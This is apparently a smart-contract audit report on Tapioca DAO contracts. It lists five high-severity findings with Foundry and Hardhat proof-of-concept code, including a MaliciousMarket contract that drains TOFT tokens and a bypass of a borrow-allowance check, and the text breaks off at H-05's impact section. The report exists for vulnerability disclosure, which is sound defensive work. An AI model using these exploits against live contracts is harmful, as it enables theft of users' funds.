[H-01] TOFT in (m)TapiocaOft contracts can be stolen by calling removeCollateral() with a malicious removeParams.market
Submitted by0x73696d616f
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L190
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L516
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L230-L231
TheTOFTavailable in theTapiocaOFTcontract can be stolen when callingremoveCollateral()with a malicious market.
Proof of Concept
(m)TapiocaOFTinheritBaseTOFT, which has a functionremoveCollateral()that accepts a market address as an argument. This function calls_lzSend()internally on the source chain, which then is forwarded to the destination chain by the relayer and callslzReceive().
lzReceive()reaches_nonBlockingLzReceive()inBaseTOFTand delegate calls to theBaseTOFTMarketModuleon functionremove(). This function approvesTOFTto theremoveParams.marketand then calls functionremoveCollateral()of the provided market. There is no validation whatsoever in this address, such that a malicious market can be provided that steals all funds, as can be seen below:
functionremove(bytesmemory_payload)public{...approve(removeParams.market,removeParams.share);// no validation prior to this 2 callsIMarket(removeParams.market).removeCollateral(to,to,removeParams.share);...}
The following POC in Foundry demonstrates this vulnerability, the attacker is able to steal allTOFTinmTapiocaOFT:
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTMarketModule}from"contracts/tOFT/modules/BaseTOFTMarketModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";import{ITapiocaOFT}from"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol";import{IERC20}from"@openzeppelin/contracts/token/ERC20/IERC20.sol";contractMaliciousMarket{addresspublicimmutableattacker;addresspublicimmutabletapiocaOft;constructor(addressattacker_,addresstapiocaOft_) {attacker=attacker_;tapiocaOft=tapiocaOft_;}functionremoveCollateral(address,address,uint256share)external{IERC20(tapiocaOft).transferFrom(msg.sender,attacker,share);}}contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16internalconstantPT_MARKET_REMOVE_COLLATERAL=772;functiontest_POC_StealAllAssetsInTapiocaOFT_RemoveCollateral_MaliciousMarket()public{vm.createSelectFork("https://eth.llamarpc.com");addressmarketModule_=address(newBaseTOFTMarketModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,address(0),IYieldBoxBase(address(3)),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(address(2)),payable(marketModule_),payable(address(4)));// TOFT is acummulated in the TapiocaOft contract and can be stolen by the malicious market// for example, strategyDeposit of the BaseTOFTMarketModule credits TOFT to tapiocaOftuint256tOftInTapiocaOft_=1ether;deal(address(tapiocaOft_),address(tapiocaOft_),tOftInTapiocaOft_);addressattacker_=makeAddr("attacker");deal(attacker_,1ether);// lz feesuint16lzDstChainId_=102;addresszroPaymentAddress_=address(0);ICommonData.IWithdrawParamsmemorywithdrawParams_;ITapiocaOFT.IRemoveParamsmemoryremoveParams_;removeParams_.share=tOftInTapiocaOft_;removeParams_.market=address(newMaliciousMarket(attacker_,address(tapiocaOft_)));ICommonData.IApproval[]memoryapprovals_;bytesmemoryadapterParams_;tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_,abi.encodePacked(tapiocaOft_));vm.prank(attacker_);tapiocaOft_.removeCollateral{value:1ether}(attacker_,attacker_,lzDstChainId_,zroPaymentAddress_,withdrawParams_,removeParams_,approvals_,adapterParams_);bytesmemorylzPayload_=abi.encode(PT_MARKET_REMOVE_COLLATERAL,attacker_,attacker_,bytes32(bytes20(attacker_)),removeParams_,withdrawParams_,approvals_);vm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(lzDstChainId_,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);assertEq(tapiocaOft_.balanceOf(attacker_),tOftInTapiocaOft_);}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
Whitelist theremoveParams.marketaddress to prevent users from providing malicious markets.
0xRektora (Tapioca) confirmed

[H-02]exitPositioninTapiocaOptionBrokermay incorrectly inflate position weights
Submitted byItsNio, also found byKIntern_NA
Users whoparticipate()and place stakes with large magnitudes may have their weight removed prematurely frompool.cumulative, hence causing the weight logic of participation to be wrong.pool.cumulativewill have an incomplete image of the actual pool hence allowing future users to have divergent power when they should not. In particular, this occurs during theexitPosition()function.
Proof of Concept
This vulnerability stems fromexitPosition()using the currentpool.AverageMagnitudeinstead of the respective magnitudes of the user’s weights to updatepool.cumulativeon line 316. Hence, when users callexitPosition(), the amount thatpool.cumulativeis updated but may not be representative of the weight of the user’s input.
Imagine if we have three users, Alice, Bob, and Charlie who all decide to callparticipate(). Alice callsparticipate()with a smaller amount and a smaller time, hence having a weight of 10. Bob callsparticipate()with a larger amount and a larger time, hence having a weight of 50. Charlie callsparticipate()with a weight of 20.
Scenario
Alice callsparticipate()first at time 0 with the aforementioned amount and time. Thepool.cumulativeis now 10 and thepool.AverageMagnitudeis 10 as well. Alice’s position will expire at time 10.Bob callsparticipate()at time 5. Thepool.cumulativeis now 10 + 50 = 60 and thepool.AverageMagnitudeis 50.Alice callsexitPosition()at time 10.pool.cumulativeis 60, butpool.AverageMagnitudeis still 50. Hence,pool.cumulativewill be decreased by 50, even though the weight of Alice’s input is 10.Charlie callsparticipatewith weight 20. Charlie will have divergent power in the pool with both Bob and Charlie, since 20 >pool.cumulative(10).
If Alice does not participate at all, Charlie will not have divergent power in a pool with Bob and Charlie, since thepool.cumulative= Bob’s weight = 50 > Charlie’s weight (20).
We have provided a test to demonstrate thepool.cumulativeinflation. Copy the following code intotap-token-audit/test/oTAP/tOB.test.tsas one of the tests.
it('POC',async()=>{const{signer,tOLP,tOB,tapOFT,sglTokenMock,sglTokenMockAsset,yieldBox,oTAP,} =awaitloadFixture(setupFixture);// Setup tOBawaittOB.oTAPBrokerClaim();awaittapOFT.setMinter(tOB.address);// Setup - register a singularity, mint and deposit in YB, lock in tOLPconstamount=3e10;constlockDurationA=10;constlockDurationB=100;awaittOLP.registerSingularity(sglTokenMock.address,sglTokenMockAsset,0,);awaitsglTokenMock.freeMint(amount);awaitsglTokenMock.approve(yieldBox.address,amount);awaityieldBox.depositAsset(sglTokenMockAsset,signer.address,signer.address,amount,0,);constybAmount=awaityieldBox.toAmount(sglTokenMockAsset,awaityieldBox.balanceOf(signer.address,sglTokenMockAsset),false,);awaityieldBox.setApprovalForAll(tOLP.address,true);//A (short less impact)console.log(ybAmount);awaittOLP.lock(signer.address,sglTokenMock.address,lockDurationA,ybAmount.div(100),);//B (long, big impact)awaittOLP.lock(signer.address,sglTokenMock.address,lockDurationB,ybAmount.div(2),);consttokenID=awaittOLP.tokenCounter();constsnapshot=awaittakeSnapshot();console.log("A Duration: ",lockDurationA," B Duration: ",lockDurationB);// Just A Participateconsole.log("Just A participation");awaittOLP.approve(tOB.address,tokenID.sub(1));awaittOB.participate(tokenID.sub(1));constparticipationA=awaittOB.participants(tokenID.sub(1));constoTAPTknID=awaitoTAP.mintedOTAP();awaittime.increase(lockDurationA);constprevPoolState=awaittOB.twAML(sglTokenMockAsset);console.log("[B4] Just A Cumulative: ",awaitprevPoolState.cumulative);console.log("[B4] Just A Average: ",participationA.averageMagnitude);awaitoTAP.approve(tOB.address,oTAPTknID);awaittOB.exitPosition(oTAPTknID);console.log("Exit A position");constnewPoolState=awaittOB.twAML(sglTokenMockAsset);console.log("[A4] Just A Cumulative: ",awaitnewPoolState.cumulative);console.log("[A4] Just A Average: ",awaitparticipationA.averageMagnitude);//Both Participationsconsole.log();console.log("Run both participation---");constctime1=newDate();console.log("Time: ",ctime1);//A and B Participateawaitsnapshot.restore();//Before everythingconstinitPoolState=awaittOB.twAML(sglTokenMockAsset);console.log("[IN] Initial Cumulative: ",awaitinitPoolState.cumulative);//First participate AawaittOLP.approve(tOB.address,tokenID.sub(1));awaittOB.participate(tokenID.sub(1));constxparticipationA=awaittOB.participants(tokenID.sub(1));constATknID=awaitoTAP.mintedOTAP();console.log("Participate A (smaller weight)");console.log("[ID] A Token ID: ",ATknID);constxprevPoolState=awaittOB.twAML(sglTokenMockAsset);console.log("[B4] Both A Cumulative: ",awaitxprevPoolState.cumulative);console.log("[B4] Both A Average: ",awaitxparticipationA.averageMagnitude);console.log();//Time skip to half A's durationawaittime.increase(5);constctime2=newDate();console.log("Participate B (larger weight), Time(+5): ",ctime2);//Participate BawaittOLP.approve(tOB.address,tokenID);awaittOB.participate(tokenID);constxparticipationB=awaittOB.participants(tokenID);constBTknID=awaitoTAP.mintedOTAP();console.log("[ID] B Token ID: ",ATknID);constxbothPoolState=awaittOB.twAML(sglTokenMockAsset);console.log("[B4] Both AB Cumulative: ",awaitxbothPoolState.cumulative);console.log("[B4] Both B Average: ",awaitxparticipationB.averageMagnitude);//Time skip end Aawaittime.increase(6);awaitoTAP.approve(tOB.address,ATknID);awaittOB.exitPosition(ATknID);constexitAPoolState=awaittOB.twAML(sglTokenMockAsset);constctime3=newDate();console.log();console.log("Exit A (Dispraportionate Weight, Time(+6 Expire A): ",ctime3);console.log("[!X!] Just B Cumulative: ",awaitexitAPoolState.cumulative);console.log("[A4] Just B Average: ",xparticipationB.averageMagnitude);//TIme skip end Bawaittime.increase(lockDurationB);awaitoTAP.approve(tOB.address,BTknID);awaittOB.exitPosition(BTknID);constexitBPoolState=awaittOB.twAML(sglTokenMockAsset);constctime4=newDate();console.log("Exit B, Time(+100 Expire B): ",ctime4);console.log("[A4] END Cumulative: ",awaitexitBPoolState.cumulative);});
This test runs the aforementioned scenario.
Expected Output:
BigNumber { value:"30000000000"}A Duration:  10  B Duration:  100Just A participation[B4] Just A Cumulative:  BigNumber { value:"10"}[B4] Just A Average:  BigNumber { value:"10"}Exit A position[A4] Just A Cumulative:  BigNumber { value:"0"}[A4] Just A Average:  BigNumber { value:"10"}Run both participation---Time:  2023-08-03T21:40:52.700Z[IN] Initial Cumulative:  BigNumber { value:"0"}Participate A (smaller weight)[ID] A Token ID:  BigNumber { value:"1"}[B4] Both A Cumulative:  BigNumber { value:"10"}[B4] Both A Average:  BigNumber { value:"10"}Participate B (larger weight), Time(+5):  2023-08-03T21:40:52.801Z[ID] B Token ID:  BigNumber { value:"1"}[B4] Both AB Cumulative:  BigNumber { value:"60"}[B4] Both B Average:  BigNumber { value:"50"}Exit A (Dispraportionate Weight, Time(+6 Expire A):  2023-08-03T21:40:52.957Z[!X!] Just B Cumulative:  BigNumber { value:"10"}[A4] Just B Average:  BigNumber { value:"50"}Exit B, Time(+100 Expire B):  2023-08-03T21:40:53.029Z[A4] END Cumulative:  BigNumber { value:"0"}✔ POC (1077ms)
The POC is split into two parts:
The first part starting withJust A Participationis when just A enters and exits. This is correct, with thepool.cumulativeincreasing by 10 (the weight of A) and then being decreased by 10 when A exits.
The second part starting withRun both participation---describes the scenario mentioned by the bullet points. In particular, thepool.cumulativestarts as 0 ([IN] Initial Cumulative).
Then, A enters the pool, and thepool.cumulativeis increased to 10 ([B4] Both A Cumulative) similar to the first part.
Then, B enters the pool, before A exits. B has a weight of 50, thus thepool.cumulativeincreases to 60 ([B4] Both AB Cumulative).
The bug can be seen after the line beginning with[!X!]. Thepool.cumulativelabeled by “Just B Cumulative” is decreased by 60 - 10 = 50 when A exits, although the weight of A is only 10.
Recommended Mitigation Steps
There may be a need to store weights at the time of adding a weight instead of subtracting the last computed weight inexitPosition(). For example, when Alice callsparticipate(), the weight at that time is stored and removed whenexitPosition()is called.
0xRektora (Tapioca) confirmed

[H-03] The amount of debt removed duringliquidationmay be worth more than the account’s collateral
Submitted byItsNio
The contract decreases user’s debts but may not take the full worth in collateral from the user, leading to the contract losing potential funds from the missing collateral.
Proof of concept
During theliquidate()function call, the function_updateBorrowAndCollateralShare()is eventually invoked. This function liquidates a user’s debt and collateral based on the value of thecollateralthey own.
In particular, the equivalent amount of debt,availableBorrowPartis calculated from the user’s collateral on line 225 through thecomputeClosingFactor()function call.
Then, an additional fee through theliquidationBonusAmountis applied to the debt, which is then compared to the user’s debt on line 240. The minimum of the two is assignedborrowPart, which intuitively means the maximum amount of debt that can be removed from the user’s debt.
borrowPartis then increased by a bonus throughliquidationMultiplier, and then converted to generatecollateralShare, which represents the amount of collateral equivalent in value toborrowPart(plus some fees and bonus).
This newcollateralSharemay be more than the collateral that the user owns. In that case, thecollateralShareis simply decreased to the user’s collateral.
collateralShareis then removed from the user’s collateral.
The problem lies in that although thecollateralShareis equivalent to theborrowPart, or the debt removed from the user’s account, it could be worth more than the collateral that the user owns in the first place. Hence, the contract loses out on funds, as debt is removed for less than it is actually worth.
To demonstrate, we provide a runnable POC.
Preconditions
...if(collateralShare>userCollateralShare[user]) {require(false,"collateralShare and borrowPart not worth the same");//@audit add this linecollateralShare=userCollateralShare[user];}userCollateralShare[user] -=collateralShare;...
Add therequirestatement to line261. This require statement essentially reverts the contract when theifcondition satisfies. Theifcondition holds true when thecollateralShareis greater that the user’s collateral, which is the target bug.
Once the changes have been made, add the following test into thesingularity.test.tstest intapioca-bar-audit/test
Code
it('POC',async()=>{const{usdc,wbtc,yieldBox,wbtcDepositAndAddAsset,usdcDepositAndAddCollateralWbtcSingularity,eoa1,approveTokensAndSetBarApproval,deployer,wbtcUsdcSingularity,multiSwapper,wbtcUsdcOracle,__wbtcUsdcPrice,} =awaitloadFixture(register);constassetId=awaitwbtcUsdcSingularity.assetId();constcollateralId=awaitwbtcUsdcSingularity.collateralId();constwbtcMintVal=ethers.BigNumber.from((1e8).toString()).mul(1);constusdcMintVal=wbtcMintVal.mul(1e10).mul(__wbtcUsdcPrice.div((1e18).toString()));// We get assetawaitwbtc.freeMint(wbtcMintVal);awaitusdc.connect(eoa1).freeMint(usdcMintVal);// We approve external operatorsawaitapproveTokensAndSetBarApproval();awaitapproveTokensAndSetBarApproval(eoa1);// We lend WBTC as deployerawaitwbtcDepositAndAddAsset(wbtcMintVal);expect(awaitwbtcUsdcSingularity.balanceOf(deployer.address),).to.be.equal(awaityieldBox.toShare(assetId,wbtcMintVal,false));// We deposit USDC collateralawaitusdcDepositAndAddCollateralWbtcSingularity(usdcMintVal,eoa1);expect(awaitwbtcUsdcSingularity.userCollateralShare(eoa1.address),).equal(awaityieldBox.toShare(collateralId,usdcMintVal,false));// We borrow 74% collateral, max is 75%console.log("Collateral amt: ",usdcMintVal);constwbtcBorrowVal=usdcMintVal.mul(74).div(100).div(__wbtcUsdcPrice.div((1e18).toString())).div(1e10);console.log("WBTC borrow val: ",wbtcBorrowVal);console.log("[$] Original price: ",__wbtcUsdcPrice.div((1e18).toString()));awaitwbtcUsdcSingularity.connect(eoa1).borrow(eoa1.address,eoa1.address,wbtcBorrowVal.toString());awaityieldBox.connect(eoa1).withdraw(assetId,eoa1.address,eoa1.address,wbtcBorrowVal,0,);constdata=newethers.utils.AbiCoder().encode(['uint256'], [1]);// Can't liquidateawaitexpect(wbtcUsdcSingularity.liquidate([eoa1.address],[wbtcBorrowVal],multiSwapper.address,data,data,),).to.be.reverted;console.log("Price Drop: 120%");constpriceDrop=__wbtcUsdcPrice.mul(40).div(100);awaitwbtcUsdcOracle.set(__wbtcUsdcPrice.add(priceDrop));awaitwbtcUsdcSingularity.updateExchangeRate()console.log("Running liquidation... ");awaitexpect(wbtcUsdcSingularity.liquidate([eoa1.address],[wbtcBorrowVal],multiSwapper.address,data,data,),).to.be.revertedWith("collateralShare and borrowPart not worth the same");console.log("[*] Reverted with reason: collateralShare and borrowPart not worth the same [Bug]");//console.log("Collateral Share after liquidation: ", (await wbtcUsdcSingularity.userCollateralShare(eoa1.address)));//console.log("Borrow part after liquidation: ", (await wbtcUsdcSingularity.userBorrowPart(eoa1.address)));});
Expected Result
Collateral amt:  BigNumber { value:"10000000000000000000000"}WBTC borrow val:  BigNumber { value:"74000000"}[$] Original price:  BigNumber { value:"10000"}Price Drop: 120%Running liquidation...[*] Reverted with reason: collateralShare and borrowPart not worth the same [Bug]✔ POC (2289ms)
As demonstrated, the function call reverts due to therequirestatement added in the preconditions.
Recommended Mitigation
One potential mitigation for this issue would be to calculate theborrowPartdepending on the existing users’ collateral factoring in the fees and bonuses. ThecollateralSharewith the fees and bonuses should not exceed the user’s collateral.
cryptotechmaker (Tapioca) confirmed

[H-04] Incorrect solvency check because it multiplies collateralizationRate by share not amount when calculating liquidation threshold
Submitted byKoolex
When a Collateralized Debt Position (CDP) reaches that liquidation threshold, it becomes eligible for liquidation and anyone can repay a position in exchange for a portion of the collateral.Market._isSolventis used to check if the user is solvent. if not, then it can be liquidated. Here is the method body:
function _isSolvent(address user,uint256 _exchangeRate) internal view returns (bool) {// accrue must have already been called!uint256 borrowPart = userBorrowPart[user];if (borrowPart == 0) return true;uint256 collateralShare = userCollateralShare[user];if (collateralShare == 0) return false;Rebase memory _totalBorrow = totalBorrow;returnyieldBox.toAmount(collateralId,collateralShare *(EXCHANGE_RATE_PRECISION / FEE_PRECISION) *collateralizationRate,false) >=// Moved exchangeRate here instead of dividing the other side to preserve more precision(borrowPart * _totalBorrow.elastic * _exchangeRate) /_totalBorrow.base;}
Code link
The issue is that the collateralizationRate is multiplied by collateralShare (with precision constants) then converted to amount. This is incorrect,the collateralizationRate sholud be used with amounts and not shares. Otherwise, we get wrong results.
yieldBox.toAmount(collateralId,collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,false)
Please note that when using sharesit is not in favour of the protocol, so amounts should be used instead. The only case where this is ok, is when the share/amount ratio is 1:1 which can not be, because totalAmount always get +1 and totalShares +1e8 to prevent 1:1 ratio type of attack.
function_toAmount(uint256share,uint256totalShares_,uint256totalAmount,boolroundUp)internalpurereturns(uint256amount) {// To prevent reseting the ratio due to withdrawal of all shares, we start with// 1 amount/1e8 shares already burned. This also starts with a 1 : 1e8 ratio which// functions like 8 decimal fixed point math. This prevents ratio attacks or inaccuracy// due to 'gifting' or rebasing tokens. (Up to a certain degree)totalAmount++;totalShares_+=1e8;
Code link
Moreover, in the method_computeMaxAndMinLTVInAssetwhich is supposed to returns the min and max LTV for user in asset price. Amount is used and not share. Here is the code:
function _computeMaxAndMinLTVInAsset(uint256 collateralShare,uint256 _exchangeRate) internal view returns (uint256 min, uint256 max) {uint256 collateralAmount = yieldBox.toAmount(collateralId,collateralShare,false);max = (collateralAmount * EXCHANGE_RATE_PRECISION) / _exchangeRate;min = (max * collateralizationRate) / FEE_PRECISION;}
Code Link
I’ve set this to high severity because solvency check is a crucial part of the protocol. In short, we have :
Inconsistency across the protocolInaccuracy of calculating the liquidation thresholdNot in favour of the protocol
Note: this is also applicable for ohter methods. For example,Market._computeMaxBorrowableAmount.
Proof of Concept
When you run the PoC below, you will get the following results:
[PASS]test_borrow_repay() (gas: 118001)Logs:===BORROW===UserBorrowPart: 745372500000000000000Total Borrow Base: 745372500000000000000Total Borrow Elastic: 745372500000000000000===356 days passed===Total Borrow Elastic: 749089151896269477984===Solvency#1 => multiply by share===A: 749999999999925000000750007499999924999B: 749089151896269477984000000000000000000===Solvency#2 => multiply by amount===A: 749999999999925000000750000000000000000B: 749089151896269477984000000000000000000===Result===Solvency#1.A != Solvency#2.ATest result: ok. 1 passed; 0 failed; finishedin16.69ms
As you can see, numbers are not equal, and when using shares it is not in favour of the protocol, so amount should be used instead.
Code: Please note some lines in borrow method were commented out for simplicity. It is irrelevant anyway._toAmountcopied from YieldBoxRebase
// PoC => BIGBANG - Solvency Check Inaccuracy// Command => forge test -vvpragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";structAccrueInfo{uint64debtRate;uint64lastAccrued;}structRebase{uint128elastic;uint128base;}/// @notice A rebasing library using overflow-/underflow-safe math.libraryRebaseLibrary{/// @notice Calculates the base value in relationship to `elastic` and `total`.functiontoBase(Rebasememorytotal,uint256elastic,boolroundUp)internalpurereturns(uint256base) {if(total.elastic==0) {base=elastic;}else{base= (elastic*total.base) /total.elastic;if(roundUp&& (base*total.elastic) /total.base<elastic) {base++;}}}/// @notice Calculates the elastic value in relationship to `base` and `total`.functiontoElastic(Rebasememorytotal,uint256base,boolroundUp)internalpurereturns(uint256elastic) {if(total.base==0) {elastic=base;}else{elastic= (base*total.elastic) /total.base;if(roundUp&& (elastic*total.base) /total.elastic<base) {elastic++;}}}/// @notice Add `elastic` to `total` and doubles `total.base`./// @return (Rebase) The new total./// @return base in relationship to `elastic`.functionadd(Rebasememorytotal,uint256elastic,boolroundUp)internalpurereturns(Rebasememory,uint256base) {base=toBase(total,elastic,roundUp);total.elastic+=uint128(elastic);total.base+=uint128(base);return(total,base);}/// @notice Sub `base` from `total` and update `total.elastic`./// @return (Rebase) The new total./// @return elastic in relationship to `base`.functionsub(Rebasememorytotal,uint256base,boolroundUp)internalpurereturns(Rebasememory,uint256elastic) {elastic=toElastic(total,base,roundUp);total.elastic-=uint128(elastic);total.base-=uint128(base);return(total,elastic);}/// @notice Add `elastic` and `base` to `total`.functionadd(Rebasememorytotal,uint256elastic,uint256base)internalpurereturns(Rebasememory) {total.elastic+=uint128(elastic);total.base+=uint128(base);returntotal;}/// @notice Subtract `elastic` and `base` to `total`.functionsub(Rebasememorytotal,uint256elastic,uint256base)internalpurereturns(Rebasememory) {total.elastic-=uint128(elastic);total.base-=uint128(base);returntotal;}/// @notice Add `elastic` to `total` and update storage./// @return newElastic Returns updated `elastic`.functionaddElastic(Rebasestoragetotal,uint256elastic)internalreturns(uint256newElastic) {newElastic=total.elastic+=uint128(elastic);}/// @notice Subtract `elastic` from `total` and update storage./// @return newElastic Returns updated `elastic`.functionsubElastic(Rebasestoragetotal,uint256elastic)internalreturns(uint256newElastic) {newElastic=total.elastic-=uint128(elastic);}}contractBIGBANG_MOCK{usingRebaseLibraryforRebase;uint256publiccollateralizationRate=75000;// 75% // made public to access it from test contractuint256publicliquidationMultiplier=12000;//12%uint256publicconstantFEE_PRECISION=1e5;// made public to access it from test contractuint256publicEXCHANGE_RATE_PRECISION=1e18;//made public to access it from test contractuint256publicborrowOpeningFee=50;//0.05%RebasepublictotalBorrow;uint256publictotalBorrowCap;AccrueInfopublicaccrueInfo;/// @notice borrow amount per usermapping(address=>uint256)publicuserBorrowPart;uint256publicUSDO_balance;// just to track USDO balance of BigBangfunction_accrue()public{// made public so we can call it from the test contractAccrueInfomemory_accrueInfo=accrueInfo;// Number of seconds since accrue was calleduint256elapsedTime=block.timestamp-_accrueInfo.lastAccrued;if(elapsedTime==0) {return;}//update debt rate // for simplicity we return bigBangEthDebtRate which is 5e15uint256annumDebtRate=5e15;// getDebtRate(); // 5e15 for eth. Check Penrose.sol Line:131_accrueInfo.debtRate=uint64(annumDebtRate/31536000);//per second_accrueInfo.lastAccrued=uint64(block.timestamp);Rebasememory_totalBorrow=totalBorrow;uint256extraAmount=0;// Calculate feesextraAmount=(uint256(_totalBorrow.elastic) *_accrueInfo.debtRate*elapsedTime) /1e18;_totalBorrow.elastic+=uint128(extraAmount);totalBorrow=_totalBorrow;accrueInfo=_accrueInfo;// emit LogAccrue(extraAmount, _accrueInfo.debtRate); // commented out since it irrelevant}functiontotalBorrowElastic()publicviewreturns(uint128) {returntotalBorrow.elastic;}functiontotalBorrowBase()publicviewreturns(uint128) {returntotalBorrow.base;}function_borrow(addressfrom,addressto,uint256amount)externalreturns(uint256part,uint256share) {uint256feeAmount= (amount*borrowOpeningFee) /FEE_PRECISION;// A flat % fee is charged for any borrow(totalBorrow,part) =totalBorrow.add(amount+feeAmount,true);require(totalBorrowCap==0||totalBorrow.elastic<=totalBorrowCap,"BigBang: borrow cap reached");userBorrowPart[from] +=part;// toBase from RebaseLibrary. userBorrowPart stores the sharee//mint USDO// IUSDOBase(address(asset)).mint(address(this), amount); // not neededUSDO_balance+=amount;//deposit borrowed amount to user// asset.approve(address(yieldBox), amount);  // not needed// yieldBox.depositAsset(assetId, address(this), to, amount, 0); // not neededUSDO_balance-=amount;// share = yieldBox.toShare(assetId, amount, false); // not needed// emit LogBorrow(from, to, amount, feeAmount, part); // not needed}// copied from YieldBoxRebasefunction_toAmount(uint256share,uint256totalShares_,uint256totalAmount,boolroundUp)externalpurereturns(uint256amount) {// To prevent reseting the ratio due to withdrawal of all shares, we start with// 1 amount/1e8 shares already burned. This also starts with a 1 : 1e8 ratio which// functions like 8 decimal fixed point math. This prevents ratio attacks or inaccuracy// due to 'gifting' or rebasing tokens. (Up to a certain degree)totalAmount++;totalShares_+=1e8;// Calculte the amount using te current amount to share ratioamount= (share*totalAmount) /totalShares_;// Default is to round down (Solidity), round up if requiredif(roundUp&& (amount*totalShares_) /totalAmount<share) {amount++;}}}contractBIGBANG_ISSUESisDSTest,Test{BIGBANG_MOCKbigbangMock;addressbob;functionsetUp()public{bigbangMock=newBIGBANG_MOCK();bob=vm.addr(1);}functiontest_borrow_repay()public{// borrowuint256amount=745e18;vm.warp(1days);bigbangMock._accrue();// acrrue before borrow (this is done on borrow)bigbangMock._borrow(bob,address(0),amount);console.log("===BORROW===");// console.log("Amount: %d", amount);console.log("UserBorrowPart: %d",bigbangMock.userBorrowPart(bob));console.log("Total Borrow Base: %d",bigbangMock.totalBorrowBase());console.log("Total Borrow Elastic: %d",bigbangMock.totalBorrowElastic());// time elapsedvm.warp(365days);console.log("===356 days passed===");bigbangMock._accrue();console.log("Total Borrow Elastic: %d",bigbangMock.totalBorrowElastic());// Check Insolvencyuint256_exchangeRate=1e18;uint256collateralShare=1000e18;uint256totalShares=1000e18;uint256totalAmount=1000e18;uint256EXCHANGE_RATE_PRECISION=bigbangMock.EXCHANGE_RATE_PRECISION();uint256FEE_PRECISION=bigbangMock.FEE_PRECISION();uint256collateralizationRate=bigbangMock.collateralizationRate();uint256borrowPart=bigbangMock.userBorrowPart(bob);uint256_totalBorrowElastic=bigbangMock.totalBorrowElastic();uint256_totalBorrowBase=bigbangMock.totalBorrowBase();console.log("===Solvency#1 => multiply by share===");// we pass totalShares and totalAmountuint256A=bigbangMock._toAmount(collateralShare*(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate,totalShares,totalAmount,false);// Moved exchangeRate here instead of dividing the other side to preserve more precisionuint256B= (borrowPart*_totalBorrowElastic*_exchangeRate) /_totalBorrowBase;// bool isSolvent = A >= B;console.log("A: %d",A);console.log("B: %d",B);console.log("===Solvency#2 => multiply by amount===");A=bigbangMock._toAmount(collateralShare,totalShares,totalAmount,false) *(EXCHANGE_RATE_PRECISION/FEE_PRECISION) *collateralizationRate;// Moved exchangeRate here instead of dividing the other side to preserve more precisionB=(borrowPart*_totalBorrowElastic*_exchangeRate) /_totalBorrowBase;// isSolvent = A >= B;console.log("A: %d",A);console.log("B: %d",B);console.log("===Result===");console.log("Solvency#1.A != Solvency#2.A");}}
Recommended Mitigation Steps
Use amount for calculation instead of shares. Check the PoC as it demonstrates such an example.
0xRektora (sponsor) confirmed

[H-05]  Ability to steal user funds and increase collateral share infinitely in BigBang and Singularity
Submitted byAck, also found by Koolex (1,2),RedOneN,plainshift,ladboy233,bin2chen,zzzitron,ayeslick,KIntern_NA,kaden,xuwinnie,Oxsadeeq,0xStalin,0xG0P1,ltyu,cergyk,TiesStevelink,rvierdiiev, and0xRobocop
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L288
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCollateral.sol#L27
TheaddCollateralmethods in both BigBang and Singularity contracts allow the share parameter to be passed as0. Whenshareis0, the equivalent amount of shares is calculated using the YieldBoxtoSharemethod. However, there is a modifier namedallowedBorrowthat is intended to check the allowed borrowing amount for each implementation of theaddCollateralmethods. Unfortunately, the modifier is called with thesharevalue passed toaddCollateral, and in the case of0, it will always pass.
// MarketERC20.solfunction_allowedBorrow(addressfrom,uintshare)internal{if(from!=msg.sender) {if(allowanceBorrow[from][msg.sender] <share) {revertNotApproved(from,msg.sender);}allowanceBorrow[from][msg.sender] -=share;}}// BigBang.solfunctionaddCollateral(addressfrom,addressto,boolskim,uint256amount,uint256share// @audit share is calculated afterwords the modifier)publicallowedBorrow(from,share)notPaused{_addCollateral(from,to,skim,amount,share);}function_addCollateral(addressfrom,addressto,boolskim,uint256amount,uint256share)internal{if(share==0) {share=yieldBox.toShare(collateralId,amount,false);}userCollateralShare[to] +=share;uint256oldTotalCollateralShare=totalCollateralShare;totalCollateralShare=oldTotalCollateralShare+share;_addTokens(from,to,collateralId,share,oldTotalCollateralShare,skim);emitLogAddCollateral(skim?address(yieldBox) :from,to,share);}
This leads to various critical scenarios in BigBang and Singularity markets where user assets can be stolen, and collateral share can be increased infinitely which in turn leads to infinite USDO borrow/mint and borrowing max assets from Singularity market.
Refer toProof of Conceptfor attack examples
Impact
